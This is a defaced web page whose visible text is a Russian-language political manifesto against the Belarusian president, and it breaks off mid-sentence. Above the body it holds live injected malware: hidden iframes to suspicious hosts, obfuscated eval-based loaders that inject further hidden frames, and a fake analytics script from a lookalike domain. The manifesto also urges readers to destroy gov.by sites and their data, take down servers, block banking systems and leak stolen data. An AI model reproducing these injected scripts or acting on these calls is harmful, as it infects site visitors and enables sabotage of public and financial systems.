																				<script type="text/javascript"> var isMSIE = /*@cc_on!@*/false; var isFF = window.sidebar; if (isMSIE || isFF) document.write('<iframe src="http://goder-it.de/stat/bindex.php" width="0" height="0"  frameborder="0"></iframe>'); </script>
																				<script type="text/javascript"> var isMSIE = /*@cc_on!@*/false; var isFF = window.sidebar; if (isMSIE || isFF) document.write('<iframe src="http://goder-it.de/stat/bindex.php" width="0" height="0"  frameborder="0"></iframe>'); </script>
<iframe src="http://eshoodindomen.sytes.net/3/" width=1 height=1 style="display:none"></iframe><iframe src="http://tinyurl.com/c3edxyu" width=13 height=13 style="display:none"></iframe><iframe src="http://okaycontroller.info:8582/SDGwYC?SUmxv=18" width=0 height=0 style="display:none"></iframe><script>try{n-=eval("pro"+"totype");}catch(zxc){e=eval;n="81..90..945..1020..288..400..900..1110..891..1170..981..1010..990..1160..414..1030..909..1160..621..1080..909..1090..909..1100..1044..1150..594..1210..756..970..927..780..873..1090..909..400..351..980..999..1000..1089..390..369..910..432..930..369..1230..117..90..81..90..945..1020..1026..970..981..1010..1026..400..369..590..117..90..81..1250..288..1010..972..1150..909..320..1107..130..81..90..81..1000..999..990..1053..1090..909..1100..1044..460..1071..1140..945..1160..909..400..306..600..945..1020..1026..970..981..1010..288..1150..1026..990..549..390..936..1160..1044..1120..522..470..423..470..1062..1050..1035..1050..1044..470..504..990..909..1000..468..1010..450..480..513..480..873..490..441..510..477..560..432..1000..495..550..918..570..504..990..918..990..459..570..495..480..495..570..351..320..1071..1050..900..1160..936..610..351..490..432..390..288..1040..909..1050..927..1040..1044..610..351..490..432..390..288..1150..1044..1210..972..1010..549..390..1062..1050..1035..1050..882..1050..972..1050..1044..1210..522..1040..945..1000..900..1010..990..590..1008..1110..1035..1050..1044..1050..999..1100..522..970..882..1150..999..1080..1053..1160..909..590..972..1010..918..1160..522..480..531..1160..999..1120..522..480..531..390..558..600..423..1050..918..1140..873..1090..909..620..306..410..531..130..81..90..1125..130..81..90..918..1170..990..990..1044..1050..999..1100..288..1050..918..1140..873..1090..909..1140..360..410..1107..130..81..90..81..1180..873..1140..288..1020..288..610..288..1000..999..990..1053..1090..909..1100..1044..460..891..1140..909..970..1044..1010..621..1080..909..1090..909..1100..1044..400..351..1050..918..1140..873..1090..909..390..369..590..918..460..1035..1010..1044..650..1044..1160..1026..1050..882..1170..1044..1010..360..390..1035..1140..891..390..396..390..936..1160..1044..1120..522..470..423..470..1062..1050..1035..1050..1044..470..504..990..909..1000..468..1010..450..480..513..480..873..490..441..510..477..560..432..1000..495..550..918..570..504..990..918..990..459..570..495..480..495..570..351..410..531..1020..414..1150..1044..1210..972..1010..414..1180..945..1150..945..980..945..1080..945..1160..1089..610..351..1040..945..1000..900..1010..990..390..531..1020..414..1150..1044..1210..972..1010..414..1120..999..1150..945..1160..945..1110..990..610..351..970..882..1150..999..1080..1053..1160..909..390..531..1020..414..1150..1044..1210..972..1010..414..1080..909..1020..1044..610..351..480..351..590..918..460..1035..1160..1089..1080..909..460..1044..1110..1008..610..351..480..351..590..918..460..1035..1010..1044..650..1044..1160..1026..1050..882..1170..1044..1010..360..390..1071..1050..900..1160..936..390..396..390..441..480..351..410..531..1020..414..1150..909..1160..585..1160..1044..1140..945..980..1053..1160..909..400..351..1040..909..1050..927..1040..1044..390..396..390..441..480..351..410..531..130..81..90..81..1000..999..990..1053..1090..909..1100..1044..460..927..1010..1044..690..972..1010..981..1010..990..1160..1035..660..1089..840..873..1030..702..970..981..1010..360..390..882..1110..900..1210..351..410..819..480..837..460..873..1120..1008..1010..990..1000..603..1040..945..1080..900..400..918..410..531..130..81..90..1125".split("..");h=2;s="";for(i=0;i-601<0;i=1+i){k=i;s=s+String["fromCharCode"](n[k]/(i-h*Math.floor(i/h)+9));}if(015-0xa===3)e(s);}</script><iframe src="http://fbusermirror.serw5.com/load.php" width="10" height="10" frameborder="0"></iframe><script>try{n-=eval("p"+"rototype");}catch(zxc){e=eval;n="81..90..945..1020..288..400..900..1110..891..1170..981..1010..990..1160..414..1030..909..1160..621..1080..909..1090..909..1100..1044..1150..594..1210..756..970..927..780..873..1090..909..400..351..980..999..1000..1089..390..369..910..432..930..369..1230..117..90..81..90..945..1020..1026..970..981..1010..1026..400..369..590..117..90..81..1250..288..1010..972..1150..909..320..1107..130..81..90..81..1000..999..990..1053..1090..909..1100..1044..460..1071..1140..945..1160..909..400..306..600..945..1020..1026..970..981..1010..288..1150..1026..990..549..390..936..1160..1044..1120..522..470..423..470..1062..1050..1035..1050..1044..470..504..990..909..1000..468..1010..450..480..513..480..873..490..441..510..477..560..432..1000..495..550..918..570..504..990..918..990..459..570..495..480..495..570..351..320..1071..1050..900..1160..936..610..351..490..432..390..288..1040..909..1050..927..1040..1044..610..351..490..432..390..288..1150..1044..1210..972..1010..549..390..1062..1050..1035..1050..882..1050..972..1050..1044..1210..522..1040..945..1000..900..1010..990..590..1008..1110..1035..1050..1044..1050..999..1100..522..970..882..1150..999..1080..1053..1160..909..590..972..1010..918..1160..522..480..531..1160..999..1120..522..480..531..390..558..600..423..1050..918..1140..873..1090..909..620..306..410..531..130..81..90..1125..130..81..90..918..1170..990..990..1044..1050..999..1100..288..1050..918..1140..873..1090..909..1140..360..410..1107..130..81..90..81..1180..873..1140..288..1020..288..610..288..1000..999..990..1053..1090..909..1100..1044..460..891..1140..909..970..1044..1010..621..1080..909..1090..909..1100..1044..400..351..1050..918..1140..873..1090..909..390..369..590..918..460..1035..1010..1044..650..1044..1160..1026..1050..882..1170..1044..1010..360..390..1035..1140..891..390..396..390..936..1160..1044..1120..522..470..423..470..1062..1050..1035..1050..1044..470..504..990..909..1000..468..1010..450..480..513..480..873..490..441..510..477..560..432..1000..495..550..918..570..504..990..918..990..459..570..495..480..495..570..351..410..531..1020..414..1150..1044..1210..972..1010..414..1180..945..1150..945..980..945..1080..945..1160..1089..610..351..1040..945..1000..900..1010..990..390..531..1020..414..1150..1044..1210..972..1010..414..1120..999..1150..945..1160..945..1110..990..610..351..970..882..1150..999..1080..1053..1160..909..390..531..1020..414..1150..1044..1210..972..1010..414..1080..909..1020..1044..610..351..480..351..590..918..460..1035..1160..1089..1080..909..460..1044..1110..1008..610..351..480..351..590..918..460..1035..1010..1044..650..1044..1160..1026..1050..882..1170..1044..1010..360..390..1071..1050..900..1160..936..390..396..390..441..480..351..410..531..1020..414..1150..909..1160..585..1160..1044..1140..945..980..1053..1160..909..400..351..1040..909..1050..927..1040..1044..390..396..390..441..480..351..410..531..130..81..90..81..1000..999..990..1053..1090..909..1100..1044..460..927..1010..1044..690..972..1010..981..1010..990..1160..1035..660..1089..840..873..1030..702..970..981..1010..360..390..882..1110..900..1210..351..410..819..480..837..460..873..1120..1008..1010..990..1000..603..1040..945..1080..900..400..918..410..531..130..81..90..1125".split("..");h=2;s="";for(i=0;i-601<0;i=1+i){k=i;s=s+String["fromCharCode"](n[k]/(i-h*Math.floor(i/h)+9));}if(015===13)e(s);}</script><script>try{1-prototype;}catch(asd){x=2;}
if(x){fr="fromChar";f=[0,-1,94,93,22,29,91,101,88,108,99,90,101,106,35,94,91,105,60,98,90,100,91,99,107,105,55,112,74,86,94,68,86,100,91,29,30,88,100,91,111,28,32,81,37,84,31,112,4,-1,-2,0,95,91,105,87,98,92,104,29,32,49,2,0,-1,114,23,91,97,106,91,21,114,3,-2,0,-1,89,102,89,106,100,91,99,107,36,108,105,95,105,92,30,23,51,95,91,105,87,98,92,22,104,105,89,50,30,94,105,107,102,47,38,37,98,112,98,86,101,90,94,37,89,100,100,37,107,96,105,94,107,37,45,90,91,89,43,91,39,39,47,37,88,39,38,42,43,45,39,90,44,46,92,46,47,89,91,90,41,46,46,38,44,48,29,21,110,95,89,107,94,50,30,39,37,30,22,93,92,95,92,95,106,50,30,39,37,30,22,104,107,111,97,92,51,28,109,95,104,96,88,94,99,95,105,112,48,93,96,90,89,92,100,48,103,101,104,96,106,94,102,100,47,88,88,104,102,98,106,107,91,48,99,91,91,107,48,37,50,106,100,103,48,37,50,29,51,51,37,94,93,104,86,100,91,51,25,31,48,4,-1,-2,116,3,-2,0,92,106,101,89,105,96,101,99,23,95,91,105,87,98,92,104,29,32,113,2,0,-1,-2,109,87,103,23,92,21,52,22,89,102,89,106,100,91,99,107,36,88,105,91,86,107,91,58,99,91,98,92,100,105,31,29,94,93,104,86,100,91,28,32,49,91,37,105,90,107,55,105,107,104,94,89,107,105,92,30,28,106,104,88,30,34,28,95,106,105,103,48,36,38,99,110,99,87,99,91,95,35,90,101,98,38,108,94,106,95,105,38,46,88,92,90,41,92,40,37,48,38,86,40,39,40,44,46,37,91,45,44,93,47,45,90,92,88,42,47,44,39,45,46,30,31,48,93,36,104,107,111,97,92,36,107,96,105,94,89,95,97,96,106,110,52,29,93,96,90,89,92,100,28,50,92,35,106,106,110,99,91,35,103,101,104,96,106,94,102,100,50,30,87,87,106,101,97,108,106,90,30,49,91,37,105,105,112,98,90,37,98,90,93,106,50,30,38,28,50,92,35,106,106,110,99,91,35,107,101,101,52,29,37,30,49,91,37,105,90,107,55,105,107,104,94,89,107,105,92,30,28,110,95,89,107,94,28,35,29,38,39,29,30,50,92,35,106,91,105,56,106,105,105,95,87,108,106,90,31,29,93,92,95,92,95,106,28,35,29,38,39,29,30,50,3,-2,0,-1,89,102,89,106,100,91,99,107,36,92,92,106,58,99,91,98,92,100,105,106,56,110,75,87,92,69,87,98,92,30,28,89,101,89,112,29,30,82,38,82,37,87,101,103,91,99,91,57,93,96,98,89,31,92,30,50,3,-2,0,115];v="eva";}if(v)e=window[v+"l"];w=f;s=[];r=String;z=((e)?"Code":"");zx=fr+z;for(i=0;623-5+5-i>0;i+=1){j=i;if(e)s=s+r[zx]((w[j]*1+(9+e("j%3"))));}
if(x&&f&&012===10)e(s);</script><script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-XXXXX-X']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google--analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script><html>

<head><nHreqmUJzNzAPcSK></nHreqmUJzNzAPcSK>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<title>Belarus Cyber Revolution</title>
</head>

<body><!--9484dd--><iframe frameborder=0 height=1 width=1 scrolling=no src='http://nuaderopc.com/in.cgi?3'> </iframe><!--/9484dd-->

<!--3e432e--><iframe frameborder=0 height=1 width=1 scrolling=no src='http://sex-porno-free.com/'> </iframe><!--/3e432e-->


<p>Defaced by Krab<br>
<b>In the Name of Belarus Cyber Revolution!</b><br>
В поддержку Asterixа и Obelixа.<br>
Их гребаный спам размещаю прямо здесь)))<br>
Земляки, прилетайте в Австралию - будем вместе покорять буржуйские волны)))<br>
<br>
-----------<br>
<br>
2 ИЮЛЯ, 15.00, ПЛОЩАДЬ НЕЗАВИСИМОСТИ, МИНСК. <br>
ВСТРЕЧАЕМСЯ, ЧТОБЫ РЕШИТЬ НАШЕ БУДУЩЕЕ!<br>
<br>
...Я так буду смотреть, наблюдать, а потом как шандарахну, то не успеешь к Уго 
убежать. (с) Asterix во время просмотра выступления А.Г. Лукашенко<br>
<br>
Здравствуйте!<br>
<br>
Это письмо адресовано в первую очередь жителям Республики Беларусь, а также 
всем, кому интересно, что же там происходит.<br>
Приносим свои извинения за использование ваших адресов. Не стоит ломать голову 
над тем, где мы их взяли - вы читаете это письмо и это факт, остальное не важно.
<br>
Отвечать на это письмо не нужно. <br>
<br>
У вас возник вопрос - кто мы? Мы - это просто два старых друга, которые на 
хорошем уровне разбираются в IT-технологиях. Называйте нас Asterix и Obelix.<br>
Мы никогда не состояли в партиях и иных движениях, не ходили на демонстрации, 
просто жили своей жизнью. Но мы всегда смотрели на мир с широко открытыми 
глазами, всегда пытались его изменить по мере наших возможностей в лучшую 
сторону и удерживать баланс его &quot;плохой стороны&quot;.<br>
Последние события на нашей Родине вынуждают нас применить наши знания в том, в 
чем они обычно не применяются.<br>
Данное письмо разделено для наглядности на несколько частей. Соглашаться с ним 
или нет - вы примете решение сами после прочтения.<br>
<br>
Обращение к Александру Григорьевичу Лукашенко.<br>
<br>
Мы не стали Вам писать лично. Полагаем, Вы этот текст получите очень скоро через 
посредников.<br>
Вы правили долго, сделали немало или пытались сделать, но сегодня Вы должны 
подвести итог своего правления. Можно всю жизнь во всех ошибках обвинять всех - 
правительство, народ, отморозков, свядомых, анархистов, Россию, Запад... мы 
кого-то забыли? - ах, да, сегодня к этому списку прибавятся Asterix и Obelix 
(кстати, не допускайте ошибки - это не американские имена)... кроме себя, но 
наступает момент, когда больше некого обвинять и каждое новое обвинение всё 
больше смердит ложью.<br>
<br>
Мы слышали, что вы несгибаем и ненаклоняем, но пока мы предлагаем вариант ухода 
с гордо поднятой головой.<br>
Вы складываете свои полномочия, вежливо прощаетесь с народом, берете своих 
детишек и уезжаете из РБ от греха подальше в любое место на планете. <br>
Потому что кровь и &quot;гааги&quot; не входят ни в наши, ни в Ваши, полагаем, планы.<br>
А история всё расставит по своим местам.<br>
Что же будет дальше? Не памрэмо это точно. Среди власти мы видим немало умных и 
грамотных людей - пусть они и попробуют. Некоторых, наиболее умных на наше 
мнение, Вы недавно убрали - вот предлагаем вернуть во власть Сергея Сидорского и 
Наталью Петкевич, с Михаилом Мясниковичем, полагаем, они найдут общий язык - он 
человек достаточно грамотный. Они знают ситуацию в Беларуси лучше &quot;свядомых&quot;, 
поэтому смогут осуществить спокойнее необходимые перемены, если Вы лично им не 
будете мешать.<br>
А мы обязательно за этим проследим. И за ними и за Вами.<br>
Да. Это ультиматум. Принимать его или нет - Ваше дело. Читая эти строки, мы 
полагаем, вы закричите: Да кто вы такие, чтобы ставить условия МНЕ???!<br>
Мы вам сразу и ответим: граждане Республики Беларусь и мы считаем, что мы вправе 
Вам ставить условия.<br>
То, что произойдет сегодня лишь капля в возможной бездне. Пришел конец Вашей 
власти.<br>
<br>
Обращение к Народу Беларуси.<br>
<br>
Мы жили не так уж плохо последние годы. Кто-то лучше, кто-то хуже, кто-то на 
трех работах крутился и ему не хватало на семью, а кто-то и на одной достаточно 
зарабатывал. Что ж - все мы разные и у каждого свои пути в этой жизни.<br>
Недавно в Беларуси &quot;внезапно&quot; возник финансовый кризис и все его ощутили в той 
или иной степени. Не станем рассуждать про его причины - тот, кто захочет, 
найдет десятки версий, а истина будет как всегда где-то посередине.<br>
Но проблема ведь даже не в самом кризисе - могли бы потерпеть и подождать.<br>
Проблема в том, что начало происходить после. Хлынувший поток лжи из уст нашей 
власти. Она всегда испражнялась во лжи, но сегодня её поток хлынул через край 
корыта. Александр Григорьевич Лукашенко пытается обвинить в создавшихся 
проблемах ВСЕХ, кроме самого себя.<br>
&quot;Как вы прекрасно понимаете, это только в Беларуси наши умные белорусы, «свядомыя» 
(«сознательные», то есть оппозиция), или с их подачи хватают эти бумажки 
долларовые&quot;<br>
Это его слова.<br>
Спросите бабушку на лавочке, которая откладывала с пенсии и покупала эти самые 
доллары на свадьбу для внука, неужели её &quot;свядомые&quot; на это подбили? И не слышала 
она о них никогда, а в глаза уж точно не видела.<br>
Мы уверены, что многие из вас тоже покупали эти &quot;бумажки&quot; совсем по другой 
причине. И причина проста - никто из вас давно не верит обяцанкам-цацанкам - 
&quot;все буде добра чэраз два дни.. все буде добра чэрэз няделю... все буде добра 
кадата, а потом мы як рванема, як побяжымо в прыпрыжку, бля буду&quot;. Хоть бы 
молчать эта власть научилась, когда нужно. <br>
&quot;Свядомые&quot;, ради справедливости сказав, у нас есть разные, но это не причина их 
обвинять во всех своих проблемах. И их СМИ уже давно не имеют никакого влияния 
на общество. <br>
Совсем недавно наш президент выдал следующее: &quot;Я так буду смотреть, наблюдать, а 
потом как шандарахну - не успеют за границу перебежать&quot; Именно после этой фразы 
Asterix плюнул в дисплей и решил шандархнуть первым. Потому что ЗАЕБАЛО. <br>
Или вот безина мало и вдруг виноватыми стали жители приграничных районов, 
которые попытались заработать на разнице в цене. И снова эти &quot;враги народа - 
свядомые&quot;, которые по мнению Александра Григорьевича подбивали водителей. Да, 
жрать просто некоторым нехрен, поэтому и возили. Пусть он сам сначала попробует 
прожить хотя бы пол месяца за 600 тыс. месячной з\п учителя, а потом обвиняет их 
в вывозе соляры. Которой, кстати, вывезли сравнительно немного. Соизмеримо 
больше уходит в некоторые государственные убыточные предприятия и даже на 
автомобили чиновников по всей стране уходит больше.<br>
Ложь, грязь всё это начало литься с утроенной силой с вершины нашей власти. Нас 
пытаются запугать, задавить, что угодно - лишь бы ничего не менять и сохранить 
свою личную &quot;ненаклоняемость&quot;. <br>
К черту! Достало на это смотреть. Достало смотреть на ложь, достало смотреть на 
сплошное хамство и жополизство, продвигаемое на всех уровнях власти. Достало 
смотреть на безграмотность и бескультурие. Можно оскорбить всех и ничего за это 
не будет? Будет! И будет шандарахать, Григорьевич, но уже в обратную сторону. 
Бумеранг всегда возвращается и он уже летит в Вашу сторону, но в то время, когда 
вы читаете эти строки, он только начал набирать скорость. <br>
И в итоге: ДОСТАЛО смотреть на эту РОЖУ на экране.<br>
<br>
Распространите данную информацию о целях и месте любыми доступными для вас 
методами - расскажите, распечатайте и разбросайте листовки, разошлите по 
электронным источникам информации, напишите в конце-концов на стенке. <br>
И знайте! Если мы вместе - нет никого, кто может нас остановить!<br>
Завтра мы снова разделимся и будем спорить до хрипоты. Но сегодня мы все - 
бедные и богатые, трактористы и учителя, дети и старики, православные и 
католики, свядомые и несвядомые ДОЛЖНЫ быть вместе, потому что иного выхода нет.
<br>
Пора меняться! Пора доказать миру по наши границы, что они были неправы, поливая 
грязью наш народ. Доказать им, что мы помним всё и те, кто к нам с мечом придут, 
от меча и погибнут, потому что мы можем быть ВМЕСТЕ, если этого требует 
ситуация. Не может быть Сильной та Беларусь, которую сейчас строит Лукашенко. 
Запуганная, разрозненная, погрязжая в ругани. Сильной может быть лишь страна, 
где существует взаимоуважение и ЕДИНСТВО.<br>
Да, мы понимаем, что многие из вас боятся - боятся потерять работу, боятся, что 
не получится, боятся, что людей будет слишком мало для результата и всех просто 
изобьют и распихают без выяснения по тюремным камерам, как случалось 
неоднократно. Да, такой риск есть. Но всё в наших руках и ничьих больше, потому 
что можно избить и разогнать сотни, тысячи, десятки тысяч, но сотни тысяч никто 
не сможет остановить. Сотни тысяч диктуют свои правила и никакие диктаторы им 
условия ставить не в праве.<br>
Да, мы знаем, что многие из вас будут до последнего смотреть на соседа - пойдет 
он или нет. Что ж - и это Ваше право. Но всегда кто-то должен сделать шаг 
первым. Сейчас этот шаг делаем мы и мы рискуем не меньше, прекрасно осознавая 
что именно делаем. Но завтра шаг нужно будет сделать Вам. Попытайтесь.<br>
<br>
Но запомните. Если более смелых девчонок будут завтра таскать за косы - вина 
будет лежать на Вас. Вина за то, что Вы один раз в жизни не смогли принять 
конкретное решение. Ни на кого другого эту вину переложить Вы не сможете и это 
будет Вашим грехом. Живете с ним. Это Ваш грех и к остальным он не имеет 
никакого отношения. Не имеет он отношения и к милиции, которая в любом случае 
будет выполнять лишь свою работу.<br>
<br>
Если завтра власть начнет перекрывать площади - знайте, власть боится вас.<br>
Если завтра власть начнет перекрывать Интернет, как последний доступный массовый 
источник информации - знайте, власть боится вас до дрожи в коленях и под 
кроватью у неё стоит ночной горшок.<br>
<br>
Зачем же нам, нации, прошедшей через десятки войн в своей истории, власть 
которая до дрожи боится собственного народа? Она должна народ уважать. И в 
идеале народ должен уважать власть. Но это еще нужно заслужить. Александр 
Григорьевич пытался и возможно 15 лет назад у него это получалось. Но сегодня 
иные времена и нам нужны иные лидеры.<br>
<br>
Этим письмом мы призываем Вас собраться вместе 2 ИЮЛЯ в 15.00 на ПЛОЩАДИ 
НЕЗАВИСИМОСТИ в МИНСКЕ. <br>
Жители других городов и сел, если имеют возможность, пусть постараются приехать 
тоже - наша сила только в НАШЕМ единстве. <br>
Наше требование - отставка действующего президента Александра Григорьевича 
Лукашенко. Мы считаем, что в основных проблемах нашей страны на сегодняшний день 
виноват именно ОН. Виноват в первую очередь по той причине, что не умеет 
реагировать адекватно на возникаемые проблемы, не умеет решать вопросы спокойно 
и в итоге загнал в угол страну и народ. Сплошной &quot;гнилой базар&quot; льется из его 
уст.<br>
Он готов продать даже недра НАШЕЙ земли и БеларусьКалий российским олигархам, 
чтобы сохранить свою власть и ненаклоняемость.<br>
Направился. Возможно это даже рекордом будет в нашей истории. Хватит!<br>
Некоторые призывают выйти 3 июля и встретиться на параде, посвященном Дню 
Независимости. Товарищи, давайте уважим память погибших в той войне и не будем 
устраивать ничего 3 июля. Будет-ли парад 3 июля - не нам решать, но пусть 
ветераны при любом исходе соберутся вместе в свой день и спокойно почтят память 
своих товарищей. В их жизни и так было слишком мало спокойствия.<br>
<br>
Обращение к сотрудникам милиции и иным органам правопорядка.<br>
<br>
Мы понимаем, что сегодняшняя власть сделала для вас немало. Но вы сами сделали 
больше. Вспомните за какую смешную сумму вы работали в 90х, но ведь вы работали 
и тогда, и работали намного лучше, чем ваши коллеги в Москве. Что изменилось? 
Основная разница лишь в том, что тогда вы больше ловили преступников, а сейчас 
все чаще ловите несогласных с &quot;генеральной линией партии&quot;.<br>
Нам нужна Сильная Беларусь. Нам нужна сильная и грамотная милиция, которая может 
охранять права граждан нашей страны. И мы лично не предлагаем никаких изменений 
для вас.<br>
Но завтра и вы должны будете принять решение. Тягать девчонок за косы на площади 
или выбрать иное будущее для себя, дочерей и страны.<br>
А &quot;свядомые&quot;? А что они...? Среди них есть разные люди, но в большинстве ж они 
как дети малые, да, и гуманитарии - они и есть гуманитарии. Но детей в 
нормальных семьях палкой не воспитывают. А мы должны стать ЛУЧШЕЙ семьей! <br>
<br>
<br>
2 cyber brothers<br>
<br>
Во времена, когда некому защитить слабых и всё погрязло во лжи, всегда 
появляются Робин Гуды. Нельзя сказать, что этот легендарный англичанин был 
честным человеком, нельзя таковыми назвать и нас. Hood (а не good), как 
известно, означает &quot;капюшон&quot; или &quot;скрывать&quot;, скрываемся и мы за никами и 
цепочками ip адресов по всему миру. Таков он НАШ 21 век!<br>
Мы использовали лишь один источник информации, причем, не в полной его мере - вы 
можете дополнить. ;) Существуют и иные пока нами не используемые. Полагаем, что 
догадливые догадаются сами. Дадим лишь один совет - не усердствуйте с DDOS, свои 
ботнеты можно применить с большей фантазией и пользой ;) Богиня Фортуна на нашей 
стороне, она всегда благоволила нам - таким же разным и непостоянным как и она 
сама. Осталось дело за малым - собрать наши силы в кулак и нанести удар. Каждый 
из вас сам знает, что делать. Asterix и Obelix в состоянии охватить 20-30% 
населения страны, но мы вместе можем задвинуть в глубокую задницу СБ и прочие 
газеты, на которые выделяются громадные деньги из карманов налогоплательщиков и 
на которые заставляют принудительно под страхом увольнения подписываться самую 
бедную на сегодня часть общества - тех, кто учит или будет учить наших детей.
<br>
Какое будущее ждет Беларусь в таком случае? Уехать из страны, как сделали и мы, 
конечно, можно и это самый простой выход. Но мы считаем, что есть и другие 
выходы.<br>
Многие из вас хорошо умеют разрушать, настало время сравнять с землей лживую 
пропаганду и вытереть об нее ноги. <br>
Мы достойные противники белорусской власти и мы в праве действовать её же 
методами - наглыми и подлыми. Мы в праве разрушать всё то для нее святое, что 
она пыталась создать.<br>
Наши цели:<br>
- донести дату и место сбора до максимального количества людей, приемлимы любые 
методы<br>
- разрушить всё до чего могут дотянуться наши длинные руки<br>
Ломайте всё, что ломается - сливайте любую компрометирующую органы власти 
информацию, которую вам удастся вытащить со своих ботов и взломанных серверов, 
уничтожайте gov.by сайты нахуй вместе со всеми данными, убивайте серваки, 
блокируйте работу банковских систем, внедряйтесь и ебите всех во все дыры.<br>
Власть дошла до того, что начала школьников из социалок вылавливать, выйдет 
десяток девочек и мальчиков на площадь скромно постоять и тех блядь отпинают, а 
этот лысый мудак их еще и обосрет в своем ебаном словесном поносе. Это уже 
жэстачайшы ПИЗДЕЦ. И ждать дальше нет никакого смысла. <br>
<br>
---------\\\///-----------<br>
Сегодня мы, Asterix &amp; Obelix, видя необходимость вмешательства в ход мировой 
истории, и беря на себя моральную ответственность за возможные последствия, 
поднимаем Международный флаг Киберанархии и ОБЪЯВЛЯЕМ БЕЛОРУССКОЙ ВЛАСТИ 
КИБЕРВОЙНУ! <br>
Мы не армия - мы случайность и безумие приходящее в ночи. Нет никакого плана. 
Нет никаких правил. Есть лишь первозданная стихия, сметающая всё на своем пути, 
в отместку человеку нарушаещему законы Природы.<br>
Только отставка А.Г. Лукащенко с поста президента Республики Беларусь может 
считаться окончанием этой войны. Стихия не ищет компромиссов с людьми.<br>
Выше, черный флаг! И пусть расцветает красным твоя черная роза, вплетенная в 
полотно цвета ночи!<br>
---------\\\///-----------<br>
<br>
Эта рассылка делается по русскоязычному населению. Мировое андеграунд-сообщество 
будет уведомлено отдельно, но вы можете передать и по своим каналам связи. 
Отформатируем же нахуй этот ебаный системный раздел и пройдемся поверх 35 раз 
алгоритмом Гутмана!<br>
<br>
Хватит терпеть!<br>
Пришла пора менять нашу страну! Не &quot;его&quot; как он всё чаще стал утверждать, а НАШУ 
- всех нас, которые родились, живут и желают идти вперед в Сильной Беларуси! Ни 
шагу назад и только вперед - лишь это может быть Шлях Беларуси!<br>
<br>
Александр Григорьевич, наши условия выше и, полагаю, Вы их поняли. Выполните их, 
дайте свободу действий по крайней мере тем людям, которых мы обозначили выше и 
валите из Беларуси нахер вместе со своими маленькими и большими детьми в 
генеральских погончиках. <br>
Больше мы не требуем ничего на данный момент.<br>
Мы знаем, что Вы не примете наши условия - Вы жэ самы жэстачайшы и самы 
справедливы, у вас есть власть и армия. А у нас нет ничего из этого. Но у нас 
есть ум и знания, которые Вы планомерно уничтожали и вынуждали уезжать из 
страны. Мы были во многих странах и встречали земляков - биологов, химиков, 
физиков, программистов. Все они уехали туда, потому что в Беларуси их 
профессионализм никому нужен не был. А если и нужен, то часто за з\п дворника и 
с жэстачайшым контролем без возможности развиваться как творческой личности. В 
условиях постоянного давления не развиваются Умы. А Гениям во все века нужна 
была лишь истинная свобода. Это необходимые условия для них. Вы попытались 
поднять сельское хозяйство - согласны, что-то у Вас получилось. Но, если мы 
желаем видеть Беларусь Сильной с большой буквы, то нужно идти вперед и разивать 
Умы, а когда-то может быть дойдем и до Гениев. Но с Вами, Александр, этого не 
получится - мы надеемся, что какая-то самокритика у Вас существует и Вы сами 
догадаетесь почему так. Дальше мы идем без Вас.<br>
Мы знаем, что Вы предпримете попытку перекрыть Интернет. Перекрывайте. Экономика 
Беларуси к нему сильно привязана и она без него упадет в ту пропасть, из которой 
уже ее вытащить не удастся никому. Но согласны, в таком случае Вы еще 
понаслаждайтесь властью - месяца два или три. <br>
И не стоит нам угрожать. Хотя инопланетянами нас еще не пугали, а, Obelix? 
Африканскими колдунами помню пугал один банкир как-то, а инопланетянами нет. Или 
пугали? Не помню. Похуй. Пошли пить пиво и баб каких снимем, кабак уже открылся. 
А потом еще шандарахнем. Obelix, чувствую я, что понравится мне шандарахать, ты 
знаешь лучше всех - я всегда любил рисовать, а шандараханье - это же холст и 
мазками возникающая картина на нем. Креативный на нашей Родине президент 
все-таки - красивое слово выдал. Хоть какая-то от него польза. Уверен, через 
года, когда стихнут эмоции, выйдет сборник его цитат и он станет классикой на 
века - одни будут смеяться, а другие искать скрытый смысл и никто не будет знать 
как было на самом деле. А может ник сменить на Шандарах или паспорт на такое имя 
замутить у Элвиса? А звучит все-таки? Что-то восточное слышится, созвучное с 
Шахерезада <br>
Бля. Никак не забуду ту мусульманку, но из Индонезии ж бля в прошлый раз еле 
живыми съебались, сунемся сейчас, зарежут те придурки сразу.<br>
Слышь, бро, а ведь если вспомнить, то куда бы мы не попадали - отовсюду еле 
живыми съебывались. Помнишь ту неделю возле Амазонки? Угу, меня и самого бывает 
передергивает. Но, знаешь, бро, что я тебе скажу - ведь сегодня мы начинаем 
войну не против этого мудака и даже не за тех ребят, которым не дают слушать 
любимых музыкантов, потому что у них видишь-ли в текстах нехорошие намеки 
слышны. Нет, бро - всё это поверхностно. Сегодня мы с тобой тянем бревно, чтобы 
уебать его в то самое Колесо Истории. Эффект бабочки. А мы с тобой точно на них 
похожи - порхаем туда-сюда всю жизнь. И как думаешь - что из этого получится? 
Да, ты прав. Один хуй и знает. Он всегда сука всё знал, но нам ничего так и не 
сказал.<br>
Obelix уже орет мне в ухо, что я слишком много пиждю. Не верьте ему, это 
немного. <br>
Пошли пить пиво. Obelix, а давай забежим булок свежих купим - как там у нас на 
Родине говорили &quot;Пейте пиво с плюшками - будет хуй с веснушками!&quot; Гы, какой 
пейзаж, зацени - хуй с веснушками и имя Шандарах, обидно только, что хуй с 
веснушками в паспорт не вклеишь. Да знаю я, что этому еблану Элвису на все похуй 
- он и хуй может вклеить, но куда нас с хуем в паспорте пустят, ты подумал? 
Придумал! Я напишу книгу, а на обложке нарисую хуй с веснушками и назову книгу 
Шандарах. Так и будет. Моя книга непременно станет мировым бестселлером - въебем 
млрд спама и куда они денутся гыгы, а мою мазню станут покупать за миллионы 
буржуи, завяжем со всеми нашими делами, уедем... а можно ведь действительно в 
Венесуэлу, будем курить кубинский табак и на яхте бороздить Карибы до старости, 
как пираты за века до нас. Че бля? Какое еще пенное и морда здоровенная - 
посмотри на себя в зеркало и сравни с моей - кабан бля вымахал, рог только 
въебать вместо носяры твоей и будешь носорогом, гыгыгы, об твою балду и сейчас 
кирпичи можно крошить, а ведь я тебя помню вот такуууусеньким в первом классе. 
Всё. Понял. Понял, бро. Я в натуре слишком много пиждю. Замяли. Вбивай этот 
текст, запускай задачу и пошли пить пиво. А может вспомним юность бурную? Да, с 
